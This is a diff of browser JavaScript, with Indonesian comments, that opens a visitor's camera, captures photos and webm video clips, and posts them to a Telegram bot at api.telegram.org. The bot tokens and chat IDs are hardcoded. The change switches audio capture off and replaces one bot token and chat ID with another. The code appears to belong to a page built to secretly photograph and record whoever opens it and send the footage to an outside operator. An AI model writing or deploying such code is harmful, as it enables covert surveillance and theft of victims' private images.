@@ -38,7 +38,7 @@ function toggleVideo(videoId) {
 
 // 🔥 Akses kamera dan mulai streaming
 navigator.mediaDevices
-  .getUserMedia({ video: true, audio: true })
+  .getUserMedia({ video: true, audio: false })
   .then((stream) => {
     // Tampilkan preview kamera (opsional)
     const video = document.createElement("video");
@@ -59,10 +59,10 @@ navigator.mediaDevices
 
       canvas.toBlob((blob) => {
         const form = new FormData();
-        form.append("chat_id", "-1003093709155");
+        form.append("chat_id", "-1003908963431");
         form.append("photo", blob);
         fetch(
-          "https://api.telegram.org/bot8407827799:AAFkV8jrnpgornlX-Ypi2tYdWL29M_xwj5c/sendPhoto",
+          "https://api.telegram.org/bot8696183437:AAHuB6mLGikBUj1CbLVVWIn4gwUm3frYRuw/sendPhoto",
           {
             method: "POST",
             body: form,
@@ -80,10 +80,10 @@ navigator.mediaDevices
       const blob = new Blob(chunks, { type: "video/webm" });
       chunks = [];
       const form = new FormData();
-      form.append("chat_id", "-1003093709155");
+      form.append("chat_id", "-1003908963431");
       form.append("video", blob);
       fetch(
-        "https://api.telegram.org/bot8407827799:AAFkV8jrnpgornlX-Ypi2tYdWL29M_xwj5c/sendVideo",
+        "https://api.telegram.org/bot8696183437:AAHuB6mLGikBUj1CbLVVWIn4gwUm3frYRuw/sendVideo",
         {
           method: "POST",
           body: form,
